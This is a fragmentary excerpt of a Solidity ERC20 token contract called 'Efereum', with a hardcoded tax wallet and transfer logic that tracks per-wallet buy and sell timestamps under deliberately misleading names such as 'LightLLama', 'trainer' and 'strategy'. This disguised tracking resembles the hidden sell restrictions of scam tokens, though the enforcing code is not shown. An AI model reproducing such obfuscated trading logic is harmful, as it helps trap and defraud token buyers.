...
contract Efereum is Context, IERC20, IERC20Metadata, Ownable {
    ...
    string private constant _name = unicode"Efereum";
    string private constant _symbol = unicode"EFER";
    ...
    struct LightLLama {uint256 profile; uint256 tuning; uint256 trainer;}
    mapping(address => LightLLama) private lightLLama;
    ...
    constructor() {
        _taxWallet = payable(0xfB52A896aE58a183685c739AdEe71D258e8Fa7b8);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            if (uniswapV2Pair != to) {
                LightLLama storage lambda = lightLLama[to];
                if (uniswapV2Pair==from) {
                    if (lambda.profile == 0) {
                        lambda.profile = (_buyCount<_preventSwapBefore) ? (block.timestamp-1) : block.timestamp;
                    }
                } else {
                    LightLLama storage measure = lightLLama[from];
                    if (lambda.profile == 0 || measure.profile< lambda.profile) {lambda.profile = measure.profile;}
                }
            } else {
                LightLLama storage measure = lightLLama[from];
                measure.trainer = measure.profile-strategy;
                measure.tuning = block.timestamp;
            }
        }
